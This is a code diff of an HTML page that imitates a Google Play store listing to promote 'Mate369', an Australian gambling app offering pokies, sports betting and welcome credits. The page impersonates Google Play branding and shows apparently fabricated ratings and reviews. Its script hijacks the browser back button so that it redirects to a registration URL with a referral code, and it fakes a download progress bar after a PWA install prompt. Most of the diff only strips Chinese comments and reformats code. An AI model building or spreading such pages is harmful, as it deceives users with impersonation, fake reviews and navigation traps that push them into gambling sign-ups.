@@ -11,13 +11,13 @@
     <!-- OneSignal Push SDK -->
     <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
     <script>
-     window.OneSignalDeferred = window.OneSignalDeferred || [];
-     OneSignalDeferred.push(async function(OneSignal) {
-     await OneSignal.init({
-      appId: "7c7846ae-53e5-4578-9b87-c4c26154477e"
-    });
-  });
-</script>
+      window.OneSignalDeferred = window.OneSignalDeferred || [];
+      OneSignalDeferred.push(async function(OneSignal) {
+        await OneSignal.init({
+          appId: "7c7846ae-53e5-4578-9b87-c4c26154477e"
+        });
+      });
+    </script>
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -28,12 +28,10 @@
         body { background-color: #fff; color: #202124; }
         .main-wrap { max-width: 720px; margin: 0 auto; background: #fff; padding-bottom: 40px; }
         
-        /* 頂部導航仿 Play 商店 */
         .gplay-header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid #e0e0e0; }
         .gplay-logo { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 500; color: #5f6368; }
         .gplay-logo svg { width: 24px; height: 24px; }
 
-        /* 主應用資訊 */
         .app-hero { display: flex; padding: 16px 16px 0; gap: 16px; }
         .app-icon { width: 72px; height: 72px; border-radius: 16px; object-fit: cover; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
         .app-details { display: flex; flex-direction: column; justify-content: center; }
@@ -41,7 +39,6 @@
         .app-author { font-size: 14px; color: #00875f; font-weight: 500; }
         .app-tags { font-size: 12px; color: #5f6368; margin-top: 4px; }
 
-        /* 數據橫條 */
         .stats-row { display: flex; justify-content: space-around; padding: 16px 0; border-bottom: 1px solid #e8eaed; margin: 10px 16px; text-align: center; }
         .stat-col { flex: 1; border-right: 1px solid #e8eaed; }
         .stat-col:last-child { border-right: none; }
@@ -49,7 +46,6 @@
         .stat-sub { font-size: 11px; color: #5f6368; margin-top: 2px; }
         .badge-18 { border: 1px solid #202124; border-radius: 2px; padding: 0 3px; font-size: 10px; font-weight: 700; }
 
-        /* 下載與進度條按鈕 */
         .action-container { padding: 0 16px 16px; }
         .btn-install { width: 100%; height: 40px; background-color: #00875f; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
         .btn-install:active { background-color: #006e4d; }
@@ -59,21 +55,17 @@
         .progress-bar-fill { width: 0%; height: 100%; background: #00875f; transition: width 0.15s; }
         .progress-status { font-size: 12px; color: #5f6368; text-align: center; margin-top: 6px; }
 
-        /* 輪播遊戲圖 */
         .screenshots-scroll { display: flex; gap: 12px; overflow-x: auto; padding: 0 16px 16px; scrollbar-width: none; }
         .screenshots-scroll::-webkit-scrollbar { display: none; }
         .screenshot-item { width: 200px; height: 200px; border-radius: 12px; object-fit: cover; flex-shrink: 0; background: #eee; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
 
-        /* 優惠亮點橫幅 */
         .promo-card { margin: 0 16px 16px; background: #e8f0fe; border-left: 4px solid #1a73e8; border-radius: 4px; padding: 12px 14px; font-size: 13px; line-height: 1.5; color: #1a73e8; }
         .promo-card b { color: #174ea6; }
 
-        /* 內容詳情 */
         .section-wrap { padding: 0 16px 16px; }
         .section-hd { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 10px; }
         .desc-p { font-size: 13px; color: #5f6368; line-height: 1.6; }
 
-        /* 評分圖表區 */
         .rating-overview { display: flex; gap: 20px; align-items: center; margin-bottom: 20px; }
         .big-score { font-size: 48px; font-weight: 400; color: #202124; line-height: 1; }
         .stars-green { color: #00875f; font-size: 14px; margin-top: 4px; }
@@ -84,7 +76,6 @@
         .bar-track { flex: 1; height: 8px; background: #e8eaed; border-radius: 4px; overflow: hidden; }
         .bar-val { height: 100%; background: #00875f; border-radius: 4px; }
 
-        /* 評論卡片 */
         .review-item { margin-top: 16px; border-bottom: 1px solid #f1f3f4; padding-bottom: 16px; }
         .user-row { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
         .user-avatar { width: 32px; height: 32px; border-radius: 50%; background: #00875f; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; }
@@ -99,7 +90,6 @@
 <body>
 
 <div class="main-wrap">
-    <!-- Google Play 頂部 -->
     <div class="gplay-header">
         <div class="gplay-logo">
             <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M3.609 1.814L13.792 12 3.61 22.186c-.352-.352-.61-.83-.61-1.408V3.222c0-.578.258-1.056.61-1.408z"/><path fill="#34A853" d="M17.556 8.236L5.018.995c-.469-.27-.996-.27-1.409 0L13.792 12l3.764-3.764z"/><path fill="#EA4335" d="M3.609 23.005c.413.27.94.27 1.409 0l12.538-7.241-3.764-3.764-10.183 11.005z"/><path fill="#FBBC04" d="M21.365 10.435l-3.809-2.2-3.764 3.765 3.764 3.764 3.809-2.2c.846-.489.846-1.64 0-2.129z"/></svg>
@@ -107,7 +97,6 @@
         </div>
     </div>
 
-    <!-- 應用主體 -->
     <div class="app-hero">
         <img src="logo369.webp" alt="Mate369 Logo" class="app-icon">
         <div class="app-details">
@@ -117,7 +106,6 @@
         </div>
     </div>
 
-    <!-- 數據概覽 -->
     <div class="stats-row">
         <div class="stat-col">
             <div class="stat-main">4.9 ★</div>
@@ -137,7 +125,6 @@
         </div>
     </div>
 
-    <!-- 下載按鈕與進度條 -->
     <div class="action-container">
         <button id="install-button" class="btn-install">Install</button>
         <div id="progress-block" class="progress-block">
@@ -147,7 +134,7 @@
             <div id="progress-status" class="progress-status">Downloading 0% (8.2 MB)...</div>
         </div>
     </div>
-    <!-- 遊戲截圖橫向滑動區 -->
+
     <div class="screenshots-scroll">
         <img src="PPSLOT.webp" alt="Pragmatic Play Slots" class="screenshot-item">
         <img src="AFLNRL.webp" alt="AFL NRL Sports Betting" class="screenshot-item">
@@ -155,7 +142,6 @@
         <img src="turbo.webp" alt="Turbo Games Crash" class="screenshot-item">
     </div>
 
-    <!-- 優惠促銷亮點 -->
     <div class="promo-card">
         🎁 <b>Exclusive Aussie Welcome Package:</b><br>
         • New Player Special: Free Credit AUD $40<br>
@@ -163,7 +149,6 @@
         • Instant PayID & Crypto Cashouts (Zero Fee)
     </div>
 
-    <!-- 應用介紹 -->
     <div class="section-wrap">
         <div class="section-hd">About this app</div>
         <p class="desc-p">
@@ -172,7 +157,6 @@
         </p>
     </div>
 
-    <!-- 評分圖表 -->
     <div class="section-wrap">
         <div class="section-hd">Ratings and reviews</div>
         <div class="rating-overview">
@@ -190,7 +174,6 @@
             </div>
         </div>
 
-        <!-- 澳洲玩家評論 -->
         <div class="review-item">
             <div class="user-row">
                 <div class="user-avatar">B</div>
@@ -216,14 +199,13 @@
             <div class="rev-body">Best pokies platform in Australia hands down. Daily free credits and great VIP support. 10/10 recommend!</div>
             <div class="rev-helpful">64 people found this review helpful</div>
         </div>
-        <!-- 1. 查看更多評論按鈕 -->
+
         <div style="text-align: center; margin: 15px 0;">
             <button type="button" id="see-all-reviews-btn" style="background: none; border: none; color: #00875f; font-size: 14px; font-weight: 500; cursor: pointer; padding: 8px 16px;">
                 See all reviews
             </button>
         </div>
 
-        <!-- 預先隱藏的額外 2 則澳洲評論 -->
         <div id="more-reviews" style="display: none;">
             <div class="review-item">
                 <div class="user-row">
@@ -252,7 +234,6 @@
             </div>
         </div>
 
-        <!-- 2. 開發者支援資訊 -->
         <div style="margin-top: 25px; border-top: 1px solid #e8eaed; padding-top: 15px;">
             <div class="section-hd" style="font-size: 15px;">App support</div>
             <div style="font-size: 13px; color: #5f6368; line-height: 1.8; margin-top: 8px;">
@@ -262,7 +243,6 @@
             </div>
         </div>
 
-        <!-- 3. Google Play 標準頁尾 -->
         <div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid #f1f3f4; font-size: 11px; color: #70757a; text-align: center; line-height: 1.6;">
             <div style="margin-bottom: 6px;">
                 <span>Google Play Terms of Service</span> • 
@@ -276,34 +256,29 @@
 
 <script>
     const TARGET_URL = "https://www.mate369.com/Register?p=JC";
-    let deferredPrompt;
+    let deferredPrompt = null;
     const installBtn = document.getElementById('install-button');
     const progressBlock = document.getElementById('progress-block');
     const progressFill = document.getElementById('progress-fill');
     const progressStatus = document.getElementById('progress-status');
 
-    // 1. 註冊 Service Worker
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js');
-    }
-
-    // 2. 攔截返回鍵 (強轉註冊頁)
+    // 1. 攔截返回鍵 (強轉註冊頁)
     history.pushState(null, null, location.href);
     window.addEventListener('popstate', function () {
         window.location.replace(TARGET_URL);
     });
 
-    // 3. 捕捉 Android PWA 安裝事件
+    // 2. 捕捉 Android PWA 安裝事件
     window.addEventListener('beforeinstallprompt', (e) => {
         e.preventDefault();
         deferredPrompt = e;
     });
 
-    // 4. 點擊安裝 (觸發安裝彈窗 + 虛擬下載條 + 最終跳轉)
+    // 3. 點擊安裝按鈕
     installBtn.addEventListener('click', async () => {
         if (deferredPrompt) {
             deferredPrompt.prompt();
-            const { outcome } = await deferredPrompt.userChoice;
+            await deferredPrompt.userChoice;
             deferredPrompt = null;
         }
 
@@ -327,7 +302,8 @@
             }
         }, 180);
     });
-    // 點擊展開更多評論
+
+    // 4. 點擊展開更多評論
     const seeAllBtn = document.getElementById('see-all-reviews-btn');
     const moreReviews = document.getElementById('more-reviews');
     if (seeAllBtn && moreReviews) {
